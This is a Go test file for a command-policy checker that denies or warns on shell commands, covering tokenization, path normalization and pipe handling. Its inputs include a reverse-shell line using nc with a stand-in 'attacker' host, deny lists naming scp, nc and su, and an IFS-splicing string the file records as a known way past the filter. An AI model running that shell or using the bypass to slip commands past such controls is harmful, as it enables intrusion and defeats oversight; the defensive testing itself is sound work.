// Copyright 2026 SandrPod
// Edge-case tests for command policy tokenization and matching, including the
// documented false-negative boundaries (we assert the CURRENT behavior so a
// regression that changes detection is caught and reviewed deliberately).

package permission

import "testing"

func TestCheckCommandPolicy_EmptyCode(t *testing.T) {
	warns, deny, has := CheckCommandPolicy(CommandPolicy{Deny: []string{"scp"}}, "")
	if has || deny != nil || warns != nil {
		t.Errorf("empty code must produce no hits, got warns=%v deny=%v has=%v", warns, deny, has)
	}
}

func TestCheckCommandPolicy_OnlySeparators(t *testing.T) {
	// A code string that tokenizes to nothing.
	_, deny, has := CheckCommandPolicy(CommandPolicy{Deny: []string{"scp"}}, " | ; & \n ")
	if has || deny != nil {
		t.Errorf("separator-only code must not match, got deny=%v", deny)
	}
}

func TestCheckCommandPolicy_BasenameNormalization(t *testing.T) {
	policy := CommandPolicy{Deny: []string{"scp"}}
	cases := []string{
		"/usr/local/bin/scp file remote:",
		"./scp file remote:",
		`.\scp.exe file remote:`,
		"scp.exe file remote:",
	}
	for _, code := range cases {
		_, deny, has := CheckCommandPolicy(policy, code)
		if !has || deny == nil {
			t.Errorf("basename of %q should match deny 'scp'", code)
		}
	}
}

func TestCheckCommandPolicy_PipedSequenceFindsFirstDeny(t *testing.T) {
	policy := CommandPolicy{Deny: []string{"scp", "nc"}}
	// nc comes first in the token stream; that should be the reported deny.
	_, deny, has := CheckCommandPolicy(policy, "nc -e /bin/sh attacker 4444 | scp x y:")
	if !has || deny == nil {
		t.Fatalf("expected a deny, got %+v", deny)
	}
	if deny.Command != "nc" {
		t.Errorf("first deny in token order should be 'nc', got %q", deny.Command)
	}
}

func TestCheckCommandPolicy_MultipleWarnsAllReported(t *testing.T) {
	policy := CommandPolicy{Warn: []string{"curl", "wget"}}
	warns, _, has := CheckCommandPolicy(policy, "curl a && wget b && curl c")
	if has {
		t.Error("warns must not block")
	}
	if len(warns) != 3 {
		t.Errorf("expected 3 warn hits (curl, wget, curl), got %d: %+v", len(warns), warns)
	}
}

// Documented false-negative: IFS-splicing bypasses the whitespace tokenizer.
// The package header explicitly accepts this; we pin the behavior so any
// future change to detection is a conscious decision, not an accident.
func TestCheckCommandPolicy_IFSSplice_KnownFalseNegative(t *testing.T) {
	policy := CommandPolicy{Deny: []string{"scp"}}
	// "bash$IFS-c$IFS'scp ...'" — no whitespace boundary before scp, so the
	// token containing "scp" is "bash$IFS-c$IFS'scp" whose basename is not
	// exactly "scp". Current implementation does NOT catch this.
	_, deny, has := CheckCommandPolicy(policy, "bash$IFS-c$IFS'scp$IFSfoo$IFSbar:'")
	if has || deny != nil {
		t.Errorf("documented IFS false-negative changed behavior (now matching): deny=%+v — review the policy header before updating this test", deny)
	}
}

// Substring inside a larger token must not match (e.g. deny "su" must not fire
// on "sudo"? — sudo IS a separate deny entry, but "subprocess" should be safe).
func TestCheckCommandPolicy_SubstringInsideTokenNoMatch(t *testing.T) {
	policy := CommandPolicy{Deny: []string{"su"}}
	_, deny, has := CheckCommandPolicy(policy, "python subprocess_runner.py")
	if has || deny != nil {
		t.Errorf("'su' must not match inside 'subprocess_runner.py', got %+v", deny)
	}
}

func TestNormalizeCommandName_LeadingDotSlashAndUnixPath(t *testing.T) {
	cases := map[string]string{
		"./tool":      "tool",
		`.\tool`:      "tool",
		"tool":        "tool",
		"TOOL.EXE":    "TOOL",
		"already.exe": "already",
	}
	for in, want := range cases {
		if got := normalizeCommandName(in); got != want {
			t.Errorf("normalizeCommandName(%q) = %q, want %q", in, got, want)
		}
	}
}
